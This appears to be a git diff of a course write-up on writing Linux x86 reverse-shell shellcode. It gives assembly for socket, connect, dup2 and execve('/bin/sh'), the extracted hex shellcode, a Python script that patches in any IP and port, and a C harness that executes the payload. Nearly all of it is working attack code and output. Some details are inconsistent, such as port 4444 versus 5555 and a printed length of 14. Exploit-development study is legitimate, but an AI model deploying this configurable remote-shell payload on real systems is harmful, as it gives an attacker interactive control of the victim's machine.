@@ -7,8 +7,8 @@ The course can be found here:
 
 ## First step: create a TCP reverse shell
 This shellcode needs to be able to:
-* Reverse conencts to configured IP and Port
-* Execs shell on successful conenction
+* Create a reverse connection to a configured IP and Port
+* Execute a shell on successful connection
 
 The second step is to create a script which will make the IP and port configuration easy
 
@@ -60,13 +60,18 @@ int main(int argc, int *argv[])
 ```
 
 Before starting, a list of linux x86 systemcall can be found in the following files
-```bash
+```console
 #cat /usr/include/asm/unistd_32.h
 ```
 On older distributions the file is stored here:
-```bash
+```console
 #cat /usr/include/i386-linux-gnu/asm/unistd_32.h
 ```
+Now, let's get to work.
+=
+
+The assembly code
+-
 
 The first step is to initialize the stack and the registers:
 ```nasm
@@ -82,15 +87,12 @@ xor ecx, ecx
 xor edx, edx
 ```
 
-## structure
+The second step is to push the sockaddr_in struct in the stack:
 ```nasm
 ;struct sockaddr_in struct
-;struct sockaddr_in {
-;	short	sin_family;
-;	u_short	sin_port;
-;	struct	in_addr sin_addr;
-;	char	sin_zero[8];
-;};
+;addr.sin_family = AF_INET;
+;addr.sin_port = htons(4444);
+;addr.sin_addr.s_addr = inet_addr("127.1.1.1");
 
 push eax
 push eax            ;padding for sin_zero sockaddr_in struct
@@ -99,7 +101,7 @@ push word 0xb315    ;port number initialize to 5555
 push word 0x02      ;network family initialize for IPv4
 ```
 
-## Socket
+We can now call the "socket" systemcall which will create an endpoint for communication:
 ```nasm
 ;s = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -110,9 +112,9 @@ int 0x80            ;go for it
 mov esi, eax        ;move return value (file descriptor) into esi
 ```
 
-## Connect
+Then, we need to call the "connect" systemcall which will initiate a connection on a socket:
 ```
-;connect(s, (struct sockaddr *)&sa, sizeof(sa));
+connect(s, (struct sockaddr *)&addr, sizeof(addr));
 
 xor eax, eax
 mov ax, 0x16a       ;connect system call number
@@ -124,7 +126,7 @@ mov edx, edi        ;get the size of the struct by using a simple soustraction
 int 0x80            ;go for it
 ```
 
-## Dup2
+This part of the code will use dup2 to redirect the STDIN, STDOUT and STDERR into the socket:
 ```nasm
 ;for (int i = 0; i < 3; i++)
 ;{
@@ -143,7 +145,7 @@ boucle:
     loop boucle
 ```
 
-## execve
+It's finaly the time to execute the shell:
 ```nasm
 ;execve("/bin/sh", 0, 0);
 
@@ -158,7 +160,7 @@ mov al, 0xb         ;system call number for execve
 int 0x80            ;go for it
 ```
 
-### Whole code
+You can find the whole code below:
 ```nasm
 ;Simple ASM (x86) reverse shell for 127.1.1.1 on port 5555
 global _start
@@ -174,12 +176,9 @@ xor ecx, ecx
 xor edx, edx
 
 ;struct sockaddr_in struct
-;struct sockaddr_in {
-;	short	sin_family;
-;	u_short	sin_port;
-;	struct	in_addr sin_addr;
-;	char	sin_zero[8];
-;};
+;addr.sin_family = AF_INET;
+;addr.sin_port = htons(4444);
+;addr.sin_addr.s_addr = inet_addr("127.1.1.1");
 push eax
 push eax            ;padding for sin_zero sockaddr_in struct
 push 0x0101017f     ;initialize ip address to 127.1.1.1 
@@ -237,10 +236,17 @@ Before explaining the python script used for this task, we need to retrieve the 
 Why ? Because our python script won't interpret our shellcode without this part.
 
 We can easily do that by using the following objdump command:
-```bash
+```console
+#objdump -d ./reverse_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+
+"\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
 ```
 
-### Python code
+We can now add this shellcode to our python script. This script is pretty simple, it parses the 'shellcode' variable content, look for the '\\x15\\xb3' pattern (which is 5555 in reverse hexadecimal) and replace it by the port value asked by the user. 
+
+It also does the same thing for the IP, it looks for the '\\x7f\\x01\\x01\\x01' pattern (which is 127.1.1.1 in reverse hexadecimal) and replace it by the ip value asked by the user.
+
+Here is the code:
 ```python
 #!/usr/bin/python3
 
@@ -272,3 +278,41 @@ shellcode = shellcode.replace('\\x15\\xb3', '\\x{0}\\x{1}'.format(port[4:6], por
 
 print(shellcode)
 ```
+
+This script will give us the following result:
+```console
+#python modify_reverse_shell.py 127.0.0.7 2222
+
+\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x00\x00\x07\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
+```
+
+In order to test it, we can now used this return and add it to a C program which will execute our shellcode
+
+The C program source code (this code can be found at root directory named 'test_shellcode.c')
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x68\x7F\x00\x00\x07\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x31\xc0\x66\xb8\x6a\x01\x89\xf3\x89\xe1\x89\xef\x29\xe7\x89\xfa\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+```
+
+Let's compile it and execute it:
+```console
+#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
+#./test_shellcode 
+Shellcode Length:  14
+
+```
+
